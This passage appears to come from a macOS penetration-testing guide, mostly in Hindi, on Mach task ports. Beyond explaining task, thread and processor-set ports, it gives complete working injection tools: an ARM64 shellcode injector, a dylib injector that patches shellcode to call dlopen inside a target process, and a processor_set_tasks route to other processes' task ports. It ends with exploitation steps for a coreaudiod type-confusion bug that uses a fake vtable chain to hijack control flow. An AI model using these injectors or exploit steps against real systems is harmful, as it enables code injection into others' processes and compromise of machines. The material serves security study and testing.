- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: निर्दिष्ट `pid` से संबंधित task के task port के लिए एक SEND right प्राप्त कर के उसे दिए गए `target_task_port` को देना (जो आमतौर पर caller task होता है जिसने `mach_task_self()` इस्तेमाल किया होता है, पर यह किसी अलग task के ऊपर एक SEND port भी हो सकता है)।
- `pid_for_task(task, &pid)`: किसी task पर दिए गए SEND right के आधार पर पता लगाना कि यह task किस PID से संबंधित है।

किसी task के अंदर क्रियाएँ करने के लिए, task को `mach_task_self()` कॉल करके खुद के लिए एक `SEND` right की आवश्यकता होती है (जो `task_self_trap` (28) का उपयोग करती है)। इस अनुमति के साथ एक task कई क्रियाएँ कर सकता है जैसे:

- `task_threads`: task के threads के सभी task ports पर SEND right प्राप्त करना
- `task_info`: किसी task के बारे में जानकारी प्राप्त करना
- `task_suspend/resume`: किसी task को suspend या resume करना
- `task_[get/set]_special_port`
- `thread_create`: एक thread बनाना
- `task_[get/set]_state`: task की स्थिति नियंत्रित करना
- और अधिक को [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) में पाया जा सकता है

> [!CAUTION]
> ध्यान दें कि किसी **different task** के task port पर SEND right होने पर, उन क्रियाओं को एक अलग task पर भी किया जा सकता है।

इसके अलावा, task_port वही **`vm_map`** पोर्ट भी है जो `vm_read()` और `vm_write()` जैसी फंक्शन्स के साथ किसी task के अंदर की memory को **पढ़ने और संशोधित करने** की अनुमति देता है। इसका अर्थ यह है कि किसी अलग task के task_port पर SEND rights रखने वाला task उस task में **code inject** कर सकेगा।

याद रखें कि क्योंकि **kernel भी एक task है**, यदि कोई व्यक्ति **`kernel_task`** पर **SEND permissions** हासिल कर लेता है, तो वह kernel को कुछ भी execute कराने में सक्षम होगा (jailbreaks)।

- `mach_task_self()` कॉल करके caller task के लिए इस पोर्ट का **name** प्राप्त करें। यह पोर्ट केवल **`exec()`** के दौरान **inherit** होता है; `fork()` से बने नए task को नया task port मिलता है (एक विशेष मामले के रूप में, suid binary में `exec()` के बाद भी एक task को नया task port मिलता है)। किसी task को spawn करके उसका port पाने का एकमात्र तरीका `fork()` करते समय ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) करना है।
- पोर्ट तक पहुँचने के ये प्रतिबंध हैं (binary `AppleMobileFileIntegrity` के `macos_task_policy` से):
- यदि ऐप के पास **`com.apple.security.get-task-allow` entitlement** है तो **एक ही user** के processes task port तक पहुँच सकते हैं (अक्सर debugging के लिए Xcode द्वारा जोड़ा जाता है)। **notarization** प्रक्रिया production releases में इसे अनुमति नहीं देगी।
- जिन apps के पास **`com.apple.system-task-ports`** entitlement होता है वे किसी भी process का **task port** प्राप्त कर सकते हैं, सिवाय kernel के। पुराने वर्ज़न में इसे **`task_for_pid-allow`** कहा जाता था। यह केवल Apple applications को दिया जाता है।
- **Root task ports तक पहुँच सकता है** उन एप्लिकेशन के जिन्हें **hardened** runtime के साथ compile नहीं किया गया है (और जो Apple के नहीं हैं)।

**The task name port:** _task port_ का एक unprivileged संस्करण। यह task को reference करता है, पर उसे नियंत्रित करने की अनुमति नहीं देता। इसके माध्यम से उपलब्ध दिखने वाली एकमात्र चीज़ `task_info()` ही है।

### Thread Ports

Threads के भी associated ports होते हैं, जो कि `task_threads` द्वारा task से और `processor_set_threads` द्वारा processor से दिखाई देते हैं। thread port पर SEND right होने से `thread_act` subsystem की functions का उपयोग करना संभव होता है, जैसे:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

कोई भी thread यह पोर्ट `mach_thread_sef` कॉल करके प्राप्त कर सकता है।

### Shellcode Injection in thread via Task port

आप shellcode प्राप्त कर सकते हैं:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**संकलित करें** पिछले प्रोग्राम को और **entitlements** जोड़ें ताकि उसी उपयोगकर्ता के साथ inject code कर सकें (यदि नहीं, तो आपको **sudo** का उपयोग करना होगा)।

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> iOS पर इसे काम करने के लिए आपको entitlement `dynamic-codesigning` की आवश्यकता होती है ताकि writable memory को executable बनाया जा सके।

### Dylib Injection in thread via Task port

macOS में **threads** को **Mach** या **posix `pthread` api`** का उपयोग करके नियंत्रित किया जा सकता है। पिछले injection में जो thread हमने बनाया था, वह Mach api का उपयोग करके बनाया गया था, इसलिए **यह posix compliant नहीं है**।

यह संभव था कि एक कमांड निष्पादित करने के लिए **inject a simple shellcode** किया जाए क्योंकि इसे **posix compliant apis** के साथ काम करने की ज़रूरत नहीं थी, केवल Mach के साथ। **More complex injections** के लिए **thread** का **posix compliant** होना आवश्यक होगा।

इसलिए, थ्रेड को बेहतर बनाने के लिए इसे **`pthread_create_from_mach_thread`** को कॉल करना चाहिए जो एक मान्य pthread बनाएगा। फिर, यह नया pthread सिस्टम से dylib को लोड करने के लिए **call dlopen** कर सकता है, इसलिए अलग-अलग क्रियाएं करने के लिए नया shellcode लिखने के बजाय custom libraries को लोड करना संभव होगा।

आप **example dylibs** पा सकते हैं (उदाहरण के लिए वह जो एक लॉग जनरेट करता है और फिर आप उसे सुन सकते हैं):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

In this technique a thread of the process is hijacked:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

जब `task_for_pid` या `thread_create_*` कॉल किया जाता है, तो kernel के struct task में एक काउंटर बढ़ता है जिसे user mode से `task_info(task, TASK_EXTMOD_INFO, ...)` कॉल करके access किया जा सकता है।

## Exception Ports

जब किसी थ्रेड में exception होता है, तो वह exception थ्रेड के निर्दिष्ट exception पोर्ट पर भेजा जाता है। यदि थ्रेड इसे संभालता नहीं है, तो यह task के exception पोर्ट्स पर भेजा जाता है। यदि task भी इसे संभालता नहीं है, तो इसे host पोर्ट पर भेजा जाता है जिसे launchd manage करता है (जहाँ इसे acknowledge किया जाएगा)। इसे exception triage कहा जाता है।

ध्यान दें कि आम तौर पर यदि सही तरीके से संभाला न जाए तो रिपोर्ट अंततः ReportCrash daemon द्वारा handle कर दी जाएगी। हालांकि, संभव है कि उसी task का कोई और थ्रेड exception को संभाल ले — यही crash reporting tools जैसे `PLCreashReporter` करती हैं।

## Other Objects

### Clock

किसी भी user द्वारा clock के बारे में जानकारी access की जा सकती है, लेकिन समय सेट करने या अन्य settings बदलने के लिए root होना आवश्यक है।

जानकारी प्राप्त करने के लिए `clock` subsystem से फंक्शन्स कॉल किए जा सकते हैं जैसे: `clock_get_time`, `clock_get_attributtes` या `clock_alarm`\
मान बदलने के लिए `clock_priv` subsystem का उपयोग किया जा सकता है, जैसे `clock_set_time` और `clock_set_attributes`

### Processors and Processor Set

processor APIs एक single logical processor को control करने की अनुमति देते हैं, जैसे `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`... कॉल करके।

इसके अलावा, **processor set** APIs कई processors को एक समूह में ग्रुप करने का तरीका देती हैं। डिफ़ॉल्ट processor set को प्राप्त करने के लिए **`processor_set_default`** कॉल किया जा सकता है।\
Processor set के साथ इंटरैक्ट करने के लिए कुछ उपयोगी APIs:

- `processor_set_statistics`
- `processor_set_tasks`: processor set के अंदर सभी tasks के send rights की array लौटाता है
- `processor_set_threads`: processor set के अंदर सभी threads के send rights की array लौटाता है
- `processor_set_stack_usage`
- `processor_set_info`

जैसा कि [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) में बताया गया है, पहले यह previously mentioned protection को bypass करके अन्य प्रक्रियाओं में task ports पाने के लिए `processor_set_tasks` कॉल करके और हर प्रक्रिया पर host port प्राप्त करके नियंत्रण करने का रास्ता देता था।\
आजकल उस फ़ंक्शन का उपयोग करने के लिए root की आवश्यकता होती है और यह protected है इसलिए आप केवल unprotected processes पर ही ये ports प्राप्त कर पाएंगे।

You can try it with:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
